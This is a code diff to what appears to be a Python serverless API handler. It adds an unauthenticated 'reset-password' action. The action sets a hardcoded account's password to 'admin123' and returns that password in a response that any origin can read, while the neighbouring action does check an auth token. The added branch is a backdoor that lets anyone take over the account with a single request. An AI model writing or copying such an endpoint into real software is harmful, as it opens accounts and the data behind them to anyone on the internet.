@@ -130,6 +130,30 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
             params = event.get('queryStringParameters', {})
             action = params.get('action', '')
             
+            if action == 'reset-password':
+                new_password = 'admin123'
+                password_hash = bcrypt.hashpw(new_password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
+                
+                cur.execute("""
+                    UPDATE users 
+                    SET password_hash = %s 
+                    WHERE email = 'ourcryptoway@gmail.com'
+                    RETURNING id, email
+                """, (password_hash,))
+                result = cur.fetchone()
+                conn.commit()
+                
+                return {
+                    'statusCode': 200,
+                    'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
+                    'body': json.dumps({
+                        'success': True,
+                        'message': 'Password reset to: admin123',
+                        'user_id': result[0] if result else None
+                    }),
+                    'isBase64Encoded': False
+                }
+            
             if action == 'users':
                 auth_token = event.get('headers', {}).get('X-Auth-Token') or event.get('headers', {}).get('x-auth-token')
                 
